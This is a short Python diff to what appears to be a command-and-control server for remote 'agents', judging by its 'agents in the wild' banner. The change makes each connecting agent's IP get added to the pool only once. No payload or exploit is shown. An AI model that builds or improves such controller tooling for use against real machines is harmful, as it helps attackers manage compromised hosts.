@@ -45,7 +45,8 @@ def start_server():
         while True:
             # Get responses:
             agent, ip = server_socket.accept()
-            agents_pool.append(ip[0])
+            if ip[0] not in agents_pool:
+                agents_pool.append(ip[0])
             print_logo()
             print(Fore.CYAN + "[*] " + Fore.RESET + Back.RESET + "Your server is " + Fore.GREEN + "UP" + Fore.RESET + ".")
             print(Fore.CYAN + "[*] " + Fore.YELLOW + "{0} ".format(len(agents_pool)) + Fore.RESET + "agents in the wild." + Fore.RESET)
